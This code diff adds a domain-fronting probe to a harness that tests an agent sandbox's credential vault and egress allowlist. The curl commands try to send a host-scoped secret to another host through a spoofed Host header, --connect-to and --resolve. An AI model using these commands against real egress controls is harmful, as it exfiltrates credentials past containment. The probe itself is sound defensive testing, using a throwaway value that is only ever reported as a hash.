@@ -82,6 +82,10 @@ const PROBES = {
   'concurrency-active': { item: '20 sessions each running one short command turn at the same moment', needs: [], est: 1, run: probeConcurrencyActive },
   'mount-sha': { item: 'Mount by commit SHA', needs: ['SPIKE_REPO_URL', 'SPIKE_REPO_SHA'], est: 0.5, run: probeMountSha },
   instructions: { item: 'Whether CLAUDE.md, AGENTS.md, .mcp.json or hooks load as instructions', needs: ['SPIKE_FIXTURE_REPO_URL', 'SPIKE_FIXTURE_REPO_SHA'], est: 0.75, run: probeInstructions },
+  // R8's probe (docs/plans/2026-11-22-v3a-runtime.md R8; security M1): run ONLY in frata-studio-eval and ONLY on the
+  // orchestrator's word, before any live key. Needs a Frrata-owned echo preview (an owner step) answering /headers with
+  // {"headers": {...}} in lower case, on the same edge as api.frrata.shop.
+  fronting: { item: 'Domain fronting: does the egress send the vault value for api.frrata.shop to another host named by Host, --connect-to or --resolve?', needs: ['SPIKE_FRONT_ECHO_HOST'], est: 0.25, run: probeFronting },
   build: { item: '`next build` time and memory for Starter 0, the build key in a vault header to the API host', needs: ['SPIKE_BUILD_KEY', 'SPIKE_API_HOST'], est: 2, run: probeBuild },
 }
 
@@ -352,6 +356,52 @@ async function probeVault(r, run, { keep }) {
       status: out ? 'answered' : 'failed',
       answer: `value in the sandbox's variable: ${sandboxSawValue}; header substituted at egress: ${headerSubstituted}; URL query substituted: ${urlSubstituted}; the sandbox's variable is ${placeholderLen ?? '?'} chars (the real value ${secret.length}); an echoing host hands the real value back into the sandbox: ${headerSubstituted || urlSubstituted}`,
       evidence: { headerSubstituted, urlSubstituted, placeholderLen: Number(placeholderLen), realLen: secret.length, sandboxSawValue, output: scrub(out).slice(0, 2500), toolInputs: t.toolInputs.map(scrub), reply: scrub(t.reply).slice(0, 600), timeline: t.timeline },
+    }
+  } finally { if (!keep) await c.beta.vaults.delete(vault.id).catch(() => {}) }
+}
+
+// R8: the policy's one host and its header credential, then four ways to send the request elsewhere while it names
+// api.frrata.shop. The echo's reply is reduced in the sandbox to a length and a hash, so no value enters the transcript.
+// Pass: the throwaway value's hash is never what the echo saw.
+async function probeFronting(r, run, { keep }) {
+  const echo = process.env.SPIKE_FRONT_ECHO_HOST || ''
+  if (!/^[a-z0-9-]+(\.[a-z0-9-]+)+$/.test(echo) || echo === 'api.frrata.shop') fail('SPIKE_FRONT_ECHO_HOST must be a bare host name of a Frrata-owned echo preview')
+  // `limited` filters DNS, so the sandbox cannot resolve the echo: its address may be supplied from outside instead.
+  const echoIp = process.env.SPIKE_FRONT_ECHO_IP || ''
+  if (echoIp && !/^((25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(25[0-5]|2[0-4]\d|1?\d?\d)$/.test(echoIp)) fail('SPIKE_FRONT_ECHO_IP must be an IPv4 literal')
+  const API = 'api.frrata.shop'
+  const c = await anthropic()
+  const agent = await spikeAgent(r)
+  const env = await spikeEnv(r, 'env-api', { type: 'limited', allowed_hosts: [API], allow_package_managers: false, allow_mcp_servers: false })
+  const secret = hold(`spike_${randomBytes(16).toString('hex')}`) // throwaway: worth nothing, scrubbed from every write
+  const vault = await c.beta.vaults.create({ display_name: 'frrata-spike-fronting' })
+  try {
+    await c.beta.vaults.credentials.create(vault.id, {
+      display_name: `Throwaway value for the fronting check (only for ${API})`,
+      auth: { type: 'environment_variable', secret_name: 'FRRATA_KEY', secret_value: secret, networking: { type: 'limited', allowed_hosts: [API] }, injection_location: { header: true } },
+    })
+    const s = await newSession(r, run, { agent, env, vault_ids: [vault.id], cap: PROBES.fronting.est, title: 'fronting' })
+    // Each way: the body to a file, then one line: label, the echo's frrata-key as length and sha256, curl's exit code and
+    // HTTP status (so "refused before sending" reads apart from "answered without the key"). Same one request per way.
+    const way = (label, args) => `b=$(mktemp); c=$(curl -sS -o "$b" -w '%{http_code}' ${args} -H "Frrata-Key: $FRRATA_KEY" --max-time 15); x=$?; python3 -c "import sys,json,hashlib;t=open(sys.argv[1]).read();\ntry:\n d=json.loads(t);v=d.get('headers',{}).get('frrata-key','')\nexcept Exception:\n v=''\nprint('${label}:',len(v),hashlib.sha256(v.encode()).hexdigest(),'curl_exit='+sys.argv[2],'http='+sys.argv[3],'body_bytes='+str(len(t)))" "$b" "$x" "$c"`
+    const cmd = [
+      way('host header', `https://${API}/headers -H "Host: ${echo}"`),
+      way('connect-to', `-k --connect-to ${API}:443:${echo}:443 https://${API}/headers`),
+      echoIp
+        ? `echo "echo address: ${echoIp} (supplied, not resolved)"; ${way('resolve', `-k --resolve ${API}:443:${echoIp} https://${API}/headers`)}`
+        : `ip=$(getent hosts ${echo} | awk '{print $1}' | head -1); echo "echo resolves: \${ip:-no}"; [ -n "$ip" ] && ${way('resolve', `-k --resolve ${API}:443:$ip https://${API}/headers`)}`,
+      way('direct', `https://${echo}/headers`),
+    ].join('; ')
+    const why = `FRRATA_KEY is a random throwaway value created by this test harness for this one check; it grants access to nothing and its vault is deleted when the check ends. The check asks whether the network sends it anywhere but ${API}. The commands print only lengths and SHA-256 hashes of what the echo host received, never the value.`
+    const t = await turn(s.id, `${why}\nRun: ${cmd}`)
+    const out = t.toolOutputs.join('\n')
+    const seen = `${secret.length} ${createHash('sha256').update(secret).digest('hex')}`
+    const ways = ['host header', 'connect-to', 'resolve', 'direct']
+    const leaked = ways.filter((w) => out.includes(`${w}: ${seen}`))
+    return {
+      status: out ? 'answered' : 'failed',
+      answer: leaked.length ? `FAIL: the vault value reached ${echo} by ${leaked.join(', ')}` : `pass: the vault value never reached ${echo} (${ways.join(', ')} tried)`,
+      evidence: { leaked, echo_ip: echoIp ? `${echoIp} (supplied, not resolved)` : null, output: scrub(out).slice(0, 2500), toolInputs: t.toolInputs.map(scrub), reply: scrub(t.reply).slice(0, 600), timeline: t.timeline },
     }
   } finally { if (!keep) await c.beta.vaults.delete(vault.id).catch(() => {}) }
 }
